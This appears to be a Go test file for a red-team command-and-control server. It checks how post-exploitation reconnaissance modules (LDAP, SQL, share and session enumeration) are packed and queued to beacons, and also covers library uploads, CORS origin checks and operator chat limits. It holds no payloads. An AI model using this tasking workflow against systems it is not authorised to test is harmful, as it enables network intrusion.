	query, rest := readBOFStringArgForTest(t, gotArgs)
	if query != "(objectClass=*)" {
		t.Fatalf("query = %q", query)
	}
	attrs, rest := readBOFStringArgForTest(t, rest)
	if attrs != "cn" {
		t.Fatalf("attrs = %q", attrs)
	}
	if len(rest) != 22 {
		t.Fatalf("ldapsearch tail len = %d, want 22", len(rest))
	}
}

func TestPackBuiltinBOFArgsMatchesTrustedSecFormats(t *testing.T) {
	netSharesArgs, ok, err := packBuiltinBOFArgs("net-shares", "")
	if err != nil || !ok {
		t.Fatalf("net-shares pack = ok:%v err:%v", ok, err)
	}
	if want := []byte{2, 0, 0, 0, 0, 0, 0, 0, 0, 0}; !bytes.Equal(netSharesArgs, want) {
		t.Fatalf("net-shares args = %v, want %v", netSharesArgs, want)
	}

	regsessionArgs, ok, err := packBuiltinBOFArgs("regsession", "")
	if err != nil || !ok {
		t.Fatalf("regsession pack = ok:%v err:%v", ok, err)
	}
	if want := []byte{1, 0, 0, 0, 0}; !bytes.Equal(regsessionArgs, want) {
		t.Fatalf("regsession args = %v, want %v", regsessionArgs, want)
	}

	netloggedonArgs, ok, err := packBuiltinBOFArgs("netloggedon", "")
	if err != nil || !ok {
		t.Fatalf("netloggedon pack = ok:%v err:%v", ok, err)
	}
	if want := []byte{2, 0, 0, 0, 0, 0, 0, 0, 0, 0}; !bytes.Equal(netloggedonArgs, want) {
		t.Fatalf("netloggedon args = %v, want %v", netloggedonArgs, want)
	}

	ldapArgs, ok, err := packBuiltinBOFArgs("ldapsearch", `(objectClass=*) --attributes cn --count 5 --scope 2 --hostname dc01 --dn "DC=example,DC=local" --ldaps`)
	if err != nil || !ok {
		t.Fatalf("ldapsearch pack = ok:%v err:%v", ok, err)
	}
	query, rest := readBOFStringArgForTest(t, ldapArgs)
	if query != "(objectClass=*)" {
		t.Fatalf("query = %q", query)
	}
	attrs, rest := readBOFStringArgForTest(t, rest)
	if attrs != "cn" {
		t.Fatalf("attrs = %q", attrs)
	}
	if got := int(binary.LittleEndian.Uint32(rest[:4])); got != 5 {
		t.Fatalf("count = %d", got)
	}
	if got := int(binary.LittleEndian.Uint32(rest[4:8])); got != 2 {
		t.Fatalf("scope = %d", got)
	}
	host, rest := readBOFStringArgForTest(t, rest[8:])
	if host != "dc01" {
		t.Fatalf("hostname = %q", host)
	}
	dn, rest := readBOFStringArgForTest(t, rest)
	if dn != "DC=example,DC=local" {
		t.Fatalf("dn = %q", dn)
	}
	if got := int(binary.LittleEndian.Uint32(rest[:4])); got != 1 {
		t.Fatalf("ldaps = %d", got)
	}

	xpipeArgs, ok, err := packBuiltinBOFArgs("xpipe", "")
	if err != nil || !ok {
		t.Fatalf("xpipe pack = ok:%v err:%v", ok, err)
	}
	value, rest := readBOFStringArgForTest(t, xpipeArgs)
	if value != "L" || len(rest) != 0 {
		t.Fatalf("xpipe default = %q rest=%d", value, len(rest))
	}

	msiArgs, ok, err := packBuiltinBOFArgs("msi-search", "")
	if err != nil || !ok {
		t.Fatalf("msi-search pack = ok:%v err:%v", ok, err)
	}
	if len(msiArgs) != 0 {
		t.Fatalf("msi-search args len = %d", len(msiArgs))
	}

	sqlInfoArgs, ok, err := packBuiltinBOFArgs("sql-info", "db01 master")
	if err != nil || !ok {
		t.Fatalf("sql-info pack = ok:%v err:%v", ok, err)
	}
	value, rest = readBOFStringArgForTest(t, sqlInfoArgs)
	if value != "db01" {
		t.Fatalf("sql-info server = %q", value)
	}
	value, rest = readBOFStringArgForTest(t, rest)
	if value != "master" || len(rest) != 0 {
		t.Fatalf("sql-info database = %q rest=%d", value, len(rest))
	}

	sqlColumnsArgs, ok, err := packBuiltinBOFArgs("sql-columns", "db01 Users appdb link1 sa")
	if err != nil || !ok {
		t.Fatalf("sql-columns pack = ok:%v err:%v", ok, err)
	}
	for _, want := range []string{"db01", "appdb", "Users", "link1", "sa"} {
		value, sqlColumnsArgs = readBOFStringArgForTest(t, sqlColumnsArgs)
		if value != want {
			t.Fatalf("sql-columns value = %q, want %q", value, want)
		}
	}
	if len(sqlColumnsArgs) != 0 {
		t.Fatalf("sql-columns rest = %d", len(sqlColumnsArgs))
	}

	sqlQueryArgs, ok, err := packBuiltinBOFArgs("sql-query", `db01 "select name from sys.databases" master link1 sa`)
	if err != nil || !ok {
		t.Fatalf("sql-query pack = ok:%v err:%v", ok, err)
	}
	for _, want := range []string{"db01", "master", "link1", "sa", "select name from sys.databases"} {
		value, sqlQueryArgs = readBOFStringArgForTest(t, sqlQueryArgs)
		if value != want {
			t.Fatalf("sql-query value = %q, want %q", value, want)
		}
	}
	if len(sqlQueryArgs) != 0 {
		t.Fatalf("sql-query rest = %d", len(sqlQueryArgs))
	}
}

func readBOFStringArgForTest(t *testing.T, data []byte) (string, []byte) {
	t.Helper()
	if len(data) < 4 {
		t.Fatalf("BOF string too short: %d", len(data))
	}
	n := int(binary.LittleEndian.Uint32(data[:4]))
	if n <= 0 || len(data) < 4+n {
		t.Fatalf("BOF string len = %d, available = %d", n, len(data))
	}
	raw := data[4 : 4+n]
	if raw[n-1] != 0 {
		t.Fatalf("BOF string missing NUL: %v", raw)
	}
	return string(raw[:n-1]), data[4+n:]
}

func TestHandleBOFObjectNamePrefersOperatorFileOverBuiltinFile(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	builtinDir := t.TempDir()
	t.Setenv("BEBOP_BUILTIN_BOF_DIR", builtinDir)
	registerTestBeaconWithArch(t, h, 78, 2, 1)

	builtinObj := make([]byte, 20)
	binary.LittleEndian.PutUint16(builtinObj[:2], 0x8664)
	builtinObj[2] = 1
	if err := os.WriteFile(filepath.Join(builtinDir, "ldapsearch.x64.o"), builtinObj, 0600); err != nil {
		t.Fatal(err)
	}
	manifest := `[{"name":"ldapsearch","file":"ldapsearch.x64.o","kind":"bof","source":"builtin"}]`
	if err := os.WriteFile(filepath.Join(builtinDir, "manifest.json"), []byte(manifest), 0600); err != nil {
		t.Fatal(err)
	}

	operatorObj := make([]byte, 20)
	binary.LittleEndian.PutUint16(operatorObj[:2], 0x8664)
	operatorObj[2] = 2
	wUpload := httptest.NewRecorder()
	h.HandleLibraryUpload(wUpload, newLibraryUploadRequest(t, "", "ldapsearch.x64.o", operatorObj))
	if wUpload.Code != http.StatusOK {
		t.Fatalf("upload status = %d", wUpload.Code)
	}

	req := newBOFNameRequest(t, map[string]string{
		"beacon_id":   "78",
		"object_name": "ldapsearch.x64.o",
	})
	w := httptest.NewRecorder()
	h.HandleBOF(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("bof status = %d body = %q", w.Code, w.Body.String())
	}

	task := h.store.GetNextTask(78)
	if task == nil {
		t.Fatal("expected queued task")
	}
	gotObj, _ := decodeBOFReqForTest(t, task.Data)
	if !bytes.Equal(gotObj, operatorObj) {
		t.Fatalf("operator object was not preferred")
	}
}

func TestHandleLibraryDeleteBlocksBuiltin(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	builtinDir := t.TempDir()
	t.Setenv("BEBOP_BUILTIN_BOF_DIR", builtinDir)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	if err := os.WriteFile(filepath.Join(builtinDir, "ldapsearch.x64.o"), obj, 0600); err != nil {
		t.Fatal(err)
	}
	manifest := `[{"name":"ldapsearch","file":"ldapsearch.x64.o","kind":"bof","source":"builtin"}]`
	if err := os.WriteFile(filepath.Join(builtinDir, "manifest.json"), []byte(manifest), 0600); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/library/ldapsearch", nil)
	req.SetPathValue("name", "ldapsearch")
	w := httptest.NewRecorder()
	h.HandleLibraryDelete(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("delete status = %d body = %q", w.Code, w.Body.String())
	}
}

func TestCORSAllowedOrigins(t *testing.T) {
	t.Setenv("BEBOP_ALLOWED_ORIGINS", "https://ops.example")
	handler := cors(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodOptions, "/api/sessions", nil)
	r.Header.Set("Origin", "https://evil.example")
	handler(w, r)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected forbidden origin, got %d", w.Code)
	}

	w = httptest.NewRecorder()
	r = httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
	r.Header.Set("Origin", "https://ops.example")
	handler(w, r)
	if got := w.Header().Get("Access-Control-Allow-Origin"); got != "https://ops.example" {
		t.Fatalf("expected allowed origin echo, got %q", got)
	}
}

func TestHandleBuild_NoBeaconSrc(t *testing.T) {
	h, s, _ := setup(t)
	l := &models.Listener{Name: "test", Scheme: "http", Host: "10.0.0.1", Port: 9010}
	s.AddListener(l)

	body := fmt.Sprintf(`{"listener_id":%d,"sleep_ms":5000,"jitter_pct":10}`, l.ID)
	req := httptest.NewRequest("POST", "/api/build", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleBuild(w, req)
	if w.Code != 501 {
		t.Fatalf("expected 501 (no beacon src), got %d", w.Code)
	}
}

func TestChatRateLimitAllowsBurst(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		if !h.chatRateLimit("alice") {
			t.Fatalf("message %d should be allowed", i)
		}
	}
}

func TestChatRateLimitRejectsOverBurst(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		_ = h.chatRateLimit("alice")
	}
	if h.chatRateLimit("alice") {
		t.Fatal("11th message should have been rejected")
	}
}

func TestChatRateLimitPerOperatorIsolated(t *testing.T) {
	h := &Handler{}
	for i := 0; i < 10; i++ {
		_ = h.chatRateLimit("alice")
	}
	if !h.chatRateLimit("bob") {
		t.Fatal("bob's first message should be allowed")
	}
}
